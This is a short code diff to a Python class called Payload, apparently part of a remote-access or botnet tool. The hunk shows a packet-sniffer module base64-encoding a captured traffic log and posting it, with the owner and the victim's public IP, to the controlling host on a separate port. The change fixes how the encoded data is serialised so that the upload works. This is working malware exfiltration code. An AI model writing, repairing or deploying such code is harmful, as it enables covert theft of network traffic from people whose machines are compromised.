@@ -1138,7 +1138,7 @@ class Payload():
                         globals()['packetsniffer'].log.seek(0)
                         host, port = self.connection.getpeername()
                         data = base64.b64encode(log.encode('utf-8'))
-                        json_data = {"data": str(data), "type": "pcap", "owner": self.owner, "module": self.packetsniffer.__name__, "session": self.info.get('public_ip')}
+                        json_data = {"data": data.decode(), "type": "pcap", "owner": self.owner, "module": self.packetsniffer.__name__, "session": self.info.get('public_ip')}
                         globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
                         return "Network traffic log upload complete"
                     else:
